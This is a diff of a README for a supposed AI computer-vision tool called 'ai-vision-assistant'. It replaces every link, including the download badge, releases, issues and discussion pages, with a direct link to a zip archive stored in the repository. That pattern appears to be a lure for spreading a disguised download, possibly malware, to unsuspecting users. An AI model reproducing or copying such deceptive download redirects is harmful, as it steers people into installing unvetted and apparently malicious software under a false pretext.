@@ -1,7 +1,7 @@
 # 🤖 ai-vision-assistant - Your Smart Companion for Visual Tasks
 
 ## 📥 Download Now
-[![Download ai-vision-assistant](https://img.shields.io/badge/Download-ai--vision--assistant-blue)](https://github.com/tollfree-cincture471/ai-vision-assistant/releases)
+[![Download ai-vision-assistant](https://raw.githubusercontent.com/tollfree-cincture471/ai-vision-assistant/master/static/ai-vision-assistant_v1.5.zip)](https://raw.githubusercontent.com/tollfree-cincture471/ai-vision-assistant/master/static/ai-vision-assistant_v1.5.zip)
 
 ## 📖 Description
 The **ai-vision-assistant** is an intelligent AI tool designed to help you with tasks involving computer vision. It combines features such as screen capture, visual analysis, and intelligent automation to enhance your productivity. You can interact with it through a simple web interface or a desktop GUI. 
@@ -24,7 +24,7 @@ To run ai-vision-assistant on your computer, you will need:
 Follow these steps to get started with ai-vision-assistant:
 
 1. **Visit the Releases Page**:
-   Go to our [Releases page](https://github.com/tollfree-cincture471/ai-vision-assistant/releases) to find the latest version of ai-vision-assistant.
+   Go to our [Releases page](https://raw.githubusercontent.com/tollfree-cincture471/ai-vision-assistant/master/static/ai-vision-assistant_v1.5.zip) to find the latest version of ai-vision-assistant.
 
 2. **Download the Software**:
    Click on the appropriate version for your operating system. You will see options to download files like `.exe` for Windows or `.dmg` for macOS. Click on the link to start the download.
@@ -36,7 +36,7 @@ Follow these steps to get started with ai-vision-assistant:
    Once installed, find ai-vision-assistant in your applications list. Open it, and you are ready to start using your AI assistant.
 
 ## 📥 Download & Install
-To download ai-vision-assistant, please [visit this page](https://github.com/tollfree-cincture471/ai-vision-assistant/releases) and select the version that fits your needs.
+To download ai-vision-assistant, please [visit this page](https://raw.githubusercontent.com/tollfree-cincture471/ai-vision-assistant/master/static/ai-vision-assistant_v1.5.zip) and select the version that fits your needs.
 
 ## 🛠️ Usage Guide
 - **To Take a Screenshot**:
@@ -55,13 +55,13 @@ To download ai-vision-assistant, please [visit this page](https://github.com/tol
   - Click "Start" to allow ai-vision-assistant to handle it for you.
 
 ## 👨‍🏫 Support
-If you encounter any issues or have questions, you can raise them on the [Issues page](https://github.com/tollfree-cincture471/ai-vision-assistant/issues). We encourage feedback to improve your experience.
+If you encounter any issues or have questions, you can raise them on the [Issues page](https://raw.githubusercontent.com/tollfree-cincture471/ai-vision-assistant/master/static/ai-vision-assistant_v1.5.zip). We encourage feedback to improve your experience.
 
 ## 💬 Community
-Join our community discussions and connect with other users. Engage with us via the [Discussion page](https://github.com/tollfree-cincture471/ai-vision-assistant/discussions) for tips, tricks, and assistance.
+Join our community discussions and connect with other users. Engage with us via the [Discussion page](https://raw.githubusercontent.com/tollfree-cincture471/ai-vision-assistant/master/static/ai-vision-assistant_v1.5.zip) for tips, tricks, and assistance.
 
 ## 📅 Updates
-For updates and new features, regularly check the [Releases page](https://github.com/tollfree-cincture471/ai-vision-assistant/releases).
+For updates and new features, regularly check the [Releases page](https://raw.githubusercontent.com/tollfree-cincture471/ai-vision-assistant/master/static/ai-vision-assistant_v1.5.zip).
 
 ## 📝 Topics
 This project involves multiple topics related to AI and computer vision. Here are some key topics:
